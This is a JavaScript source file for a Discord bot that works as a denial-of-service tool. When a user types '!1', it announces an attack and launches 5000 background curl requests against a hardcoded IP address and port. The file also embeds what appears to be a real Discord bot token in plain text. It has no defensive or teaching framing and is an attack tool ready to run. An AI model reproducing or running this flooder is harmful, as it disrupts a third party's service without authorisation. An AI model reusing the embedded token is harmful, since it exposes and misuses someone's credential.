const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const target = "http://158.69.171.5:4500";
client.on('messageCreate', message => {
  if (message.content === '!1') {
    message.reply('Ataque BR max ativado!');
    for(let i = 0; i < 5000; i++) {
      require('child_process').exec(`curl -s ${target} &`);
    }
  }
});
client.login('MTUwNjgyMjY5NTM5MDY3OTIwMA.GbRx6s.lZXbh7Apn9WIjyqE4nwTJ4M32ya7AzXFpFEbYo');
